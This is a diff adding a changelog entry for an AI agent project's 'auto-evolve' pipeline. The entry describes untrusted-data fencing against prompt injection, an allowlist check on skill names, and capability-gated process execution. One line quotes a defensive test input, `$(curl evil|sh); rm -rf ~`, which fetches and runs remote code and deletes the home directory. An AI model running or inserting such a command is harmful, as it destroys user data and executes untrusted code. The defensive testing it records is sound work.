@@ -599,3 +599,55 @@ adversarial review workflow whose NEEDS_FIXES verdict drove the fix pass below.
   root-only); `task_grants` keyed by handler_id vs task id (two tasks sharing a handler collide — a
   design + migration decision); `emitProgress` redaction under `redactSummaries` (no spec SHALL); the
   `/events` oldest-500 backfill cap.
+
+## Auto-evolve pipeline — scheduled reflect -> propose -> gated-additive skill acquisition — SHIPPED
+
+`specs/auto-evolve.md` (requirement #5 auto-evolve + #6 elegant+secure of the personal-agent reframe).
+No Linear issue (workspace issue-capped) -> this entry + the commit are the record (Rule 11 fallback).
+A proposal-only + gated-additive vertical that ships standalone — depends only on SHIPPED seams
+(per-task grants, the `events` table, the scheduler cron path, the injectable `ProcessRunner`), NOT on
+the still-blocked forge sandbox (it executes no LLM-generated code).
+
+- **New `auto-evolve` core module (`vesper-core/src/auto-evolve/`, all pure, 100% lines):**
+  `skill-name.ts` (the security linchpin — `isAllowedSkillName`: `^[a-z0-9][a-z0-9-]{0,63}$` + an
+  allowlisted `owner/` source prefix, `unknown`-typed so it guards the runtime boundary); `gather.ts`
+  (`gatherSignals` — windows `Store.listRuns` + `TaskPersistence.{listFailedTasks,list}` by `sinceMs`,
+  rolls up error runs by pipeline, builds a deterministic, length-capped digest — each error field
+  collapsed + capped to mitigate prompt-injection); `reflect.ts` (`buildReflectPrompt` — frames the
+  digest inside an explicit UNTRUSTED-DATA fence, modeled on skill-train's `buildOptimizerPrompt`);
+  `parse.ts` (`parseEvolveReport` — fenced-JSON closed shape, FAIL-CLOSED `{ok}` result, never throws,
+  never `eval`, drops malformed proposal entries).
+- **`PROCESS_RUN` capability (10th value, union + tuple + `isCapability`):** a distinct, dangerous
+  side effect no existing cap covered (FS_WRITE = files, NETWORK_FETCH = HTTP). The DEFAULT task omits
+  it, so the out-of-the-box build literally cannot shell out. Persists into the existing
+  `task_grants`/`scheduled_tasks` TEXT columns — no DDL, no migration.
+- **`ctx.readSignals(opts)` read seam (READ_STORAGE-gated, on `PipelineContext`):** returns a FROZEN
+  `EvolveSignals` snapshot (not the live Store), so a handler cannot read past its window or write
+  through it. Mirrors the `recordRun`/`emitProgress` capability-gate template; the scheduler passes its
+  `TaskPersistence` handle into `buildPipelineContext` (new optional `taskPersistence` dep; absent ->
+  failed-task/last-error sections read empty, run-derived signals still work).
+- **`auto-evolve` pipeline (`packages/pipelines/auto-evolve/`):** factory `createAutoEvolveHandler(deps)`
+  closes over injected `appendEvent` + `runProcess` seams (so the unit suite shells out to nothing and
+  writes no real DB); the default-registered `autoEvolveHandler` opens the store lazily per write +
+  uses the real `runProcess`. Stage 3 writes one `report` + one `skill_proposal`/skill +
+  one `fix_proposal`/fix to `events` under `source:"auto-evolve"` (reuse the events table, no migration).
+  Acquisition runs `bunx skills add <name> --yes` ONLY when (a) `acquire=true`, (b) the task declares
+  PROCESS_RUN (else `assertCapabilities` throws before any process), and (c) the name passes
+  `isAllowedSkillName` (a failing name -> `acquire_skipped` audit, never executed); the name is a
+  discrete `args[]` element (no shell string). Cron `0 3 * * *`, `enabled:false` (opt-in),
+  `max_runs_per_day:1`, `max_duration_ms:300000`; default cap set is proposal-only.
+- **`vesper evolve list` (read-only CLI):** renders the latest `report` + open skill/fix proposals via
+  `listEvents({source:"auto-evolve"})`. CLI glue — no TDD (Hard rule 7).
+- SAFETY HELD: proposal-only for code (handler writes ZERO files; `fix_proposal` is the explicit hand-off
+  to the human-gated software-engineer pipeline); gated-additive-only for skills; untrusted `last_error`
+  reaches the prompt only as framed, capped data and reaches NO process invocation — proven by a test
+  that injects `$(curl evil|sh); rm -rf ~` as both a `last_error` and an echoed skill name and asserts
+  the runner is never called.
+- 667 tests / 0 fail (+ the auto-evolve suite: skill-name, gather, parse/reflect, context readSignals,
+  scheduler end-to-end readSignals, handler); auto-evolve core 100% lines, handler 95% (the only
+  uncovered span is the FS-coupled default store-opening closure, intentionally not unit-tested); Biome
+  clean; no NEW tsc errors (same 16 PRE-EXISTING Bun-vs-tsc friction errors in unrelated files); no
+  provider SDKs in `bun.lock`.
+- DEFERRED (per spec Out of Scope): applying `fix_proposal`s (software-engineer pipeline); authoring
+  pipeline CODE (forge, blocked on the sandbox); `NETWORK_FETCH`; a RAG/embedding index over signals;
+  an elder-surface approval tile; auto-running skill-train on a newly acquired skill.
